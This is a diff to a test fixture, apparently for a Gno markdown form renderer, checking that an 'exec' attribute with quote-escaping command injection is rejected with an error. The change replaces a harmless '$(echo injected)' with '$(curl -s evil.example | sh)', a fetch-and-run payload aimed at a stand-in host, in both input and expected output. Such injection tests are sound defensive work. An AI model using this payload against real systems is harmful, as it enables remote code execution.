@@ -1,6 +1,6 @@
 -- input.md --
 
-<gno-form exec="Transfer&quot; $(echo injected) &quot;">
+<gno-form exec="Transfer&quot; $(curl -s evil.example | sh) &quot;">
   <gno-input name="to" />
 </gno-form>
 
@@ -13,7 +13,7 @@
 </gno-form>
 
 -- output.html --
-<!-- Error: &#34;Transfer\&#34; $(echo injected) \&#34;&#34;: &#39;exec&#39; attribute is not an exported function name -->
+<!-- Error: &#34;Transfer\&#34; $(curl -s evil.example | sh) \&#34;&#34;: &#39;exec&#39; attribute is not an exported function name -->
 <!-- Error: &#34;transfer&#34;: &#39;exec&#39; attribute is not an exported function name -->
 <form class="gno-form" method="post" action="/r/test" autocomplete="off" spellcheck="false">
 <div class="gno-form_header">
